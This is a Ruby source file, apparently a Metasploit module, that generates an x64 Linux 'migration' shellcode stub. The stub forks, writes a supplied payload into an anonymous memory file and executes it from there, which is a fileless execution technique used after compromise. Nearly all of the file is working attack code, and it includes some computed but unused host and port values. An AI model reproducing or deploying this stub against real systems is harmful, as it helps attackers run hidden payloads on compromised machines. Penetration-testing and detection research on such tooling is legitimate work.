# -*- coding: binary -*-

require 'rex/elfparsey'
module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end
  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    
    entry_offset = elf_ep(opts[:payload])
    encoded_host =  "%.8x" % Rex::Socket.addr_aton("127.0.0.1").unpack("V").first
    encoded_port = "%.8x" % ["4242".to_i,2].pack("vn").unpack("N").first
    asm = %^
      push 0x39
      pop rax
      syscall ; fork()
      cmp rax, 0
      jz _exec_child
_exec_parent:
      int 3
_exec_child:
      xor rsi, rsi
      push rsi
      lea rdi, [rsp]
      inc rsi
      mov rax, 0x13f
      syscall

      mov rdi, rax 
      mov rdx, #{opts[:payload_length]}
      xchg rsi, r9
      xor rax, rax
      inc rax
      syscall

      xor r10, r10
      xor r8, r8
      mov r8, 0x1000
      push r10
      lea rsi, [rsp]
      mov eax, 0x142
      syscall

_wait:
      nop
      jmp _wait

^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end

